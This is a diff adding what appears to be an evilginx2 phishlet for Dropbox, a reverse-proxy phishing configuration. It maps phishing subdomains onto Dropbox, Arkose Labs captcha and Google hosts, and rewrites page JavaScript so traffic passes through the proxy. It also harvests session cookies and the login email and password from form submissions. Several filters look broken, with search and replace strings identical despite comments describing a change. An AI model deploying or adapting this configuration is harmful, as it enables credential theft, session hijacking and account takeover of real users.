@@ -1,0 +1,104 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'dropbox.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'dropbox.com', session: true, is_landing: false}
+  - {phish_sub: 'cfl', orig_sub: 'cfl', domain: 'dropboxstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'googletag', orig_sub: 'www', domain: 'googletagmanager.com', session: false, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'google-analytics', orig_sub: 'www', domain: 'google-analytics.com', session: false, is_landing: false}
+  - {phish_sub: 'paper', orig_sub: 'paper', domain: 'dropbox.com', session: true, is_landing: false} 
+  - {phish_sub: 'tags', orig_sub: 'tags', domain: 'tiqcdn.com', session: false, is_landing: false}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'dropboxcaptcha', orig_sub: '', domain: 'dropboxcaptcha.com', session: false, is_landing: false}
+  - {phish_sub: 'dropbox-api', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'client-api', orig_sub: 'client-api', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'arkoselabs.com', session: false, is_landing: false}
+  - {phish_sub: 'marketing', orig_sub: 'marketing', domain: 'dropbox.com', session: false, is_landing: false}
+
+sub_filters:
+ 
+
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cfl', domain: 'dropboxstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google-analytics.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'tags', domain: 'tiqcdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'tags', domain: 'tiqcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: 'dropboxcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'dropbox-api', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'client-api', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'cdn', domain: 'arkoselabs.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'marketing', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'marketing', domain: 'dropbox.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'paper', domain: 'dropbox.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'paper', domain: 'dropbox.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+# Below Triggers to replace this '.dropbox.com' in all javascripts.
+
+  - {triggers_on: 'www.dropbox.com', orig_sub: '', domain: 'dropbox.com', search: "dropbox.com", replace: "{hostname}", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: '', domain: 'dropbox.com', search: "dropbox.com", replace: "{hostname}", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+# Below Trigger To Activate the Login Form Submit Even After Few Fails in tests.
+# Order Of File Manipulation matters here. So Play Safe Here ///
+# Change    isSendingInvite:!0     to     isSendingInvite:!1
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 'isSendingInvite:!1', replace: 'isSendingInvite:!1', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: 'isSendingInvite:!1', replace: 'isSendingInvite:!1', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+# change    isSendingInvite:!1     to     isSendingInvite:!0 
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: ",(function(){return i.setState({isSendingInvite:!0})})", replace: ",(function(){return i.setState({isSendingInvite:!0})})", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: ",(function(){return i.setState({isSendingInvite:!0})})", replace: ",(function(){return i.setState({isSendingInvite:!0})})", mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+# Change t._rpc(e+"/"+r,n,o)    to    t._rpc(r,n,o+"/"+r,n,o)  in js https://cfl.dropboxstatic.com/static/js/packaged/pkg-api_v2.min-vfldDs052.js
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 't._rpc(e+"/"+r,n,o)', replace: 't._rpc(r,n,o+"/"+r,n,o)', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: 't._rpc(e+"/"+r,n,o)', replace: 't._rpc(r,n,o+"/"+r,n,o)', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+# Change t._upload(e+"/"+r,n,o,i) to   t._upload(r,n,o,i+"/"+r,n,o,i)
+  - {triggers_on: 'www.dropbox.com', orig_sub: 'www', domain: 'dropbox.com', search: 't._upload(e+"/"+r,n,o,i)', replace: 't._upload(r,n,o,i+"/"+r,n,o,i)', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhr']}
+  - {triggers_on: 'cfl.dropboxstatic.com', orig_sub: 'cfi', domain: 'dropboxstatic.com', search: 't._upload(e+"/"+r,n,o,i)', replace: 't._upload(r,n,o,i+"/"+r,n,o,i)', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhr']}
+
+auth_tokens:
+  - domain: 'www.dropbox.com'
+    keys: ['sessionid','.*,regexp']
+  - domain: 'client-api.arkoselabs.com'
+    keys: ['sessionid','.*,regexp']  
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+  
+  email:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  
+  encrypted_password:
+    key: 'encrypted_password'
+    search: '(.*)'
+    type: 'post'
+  
+  public_key:
+    key: 'public_key'
+    search: '(.*)'
+    type: 'post'    
+
+login:
+  domain: 'www.dropbox.com'
+  path: '/login'
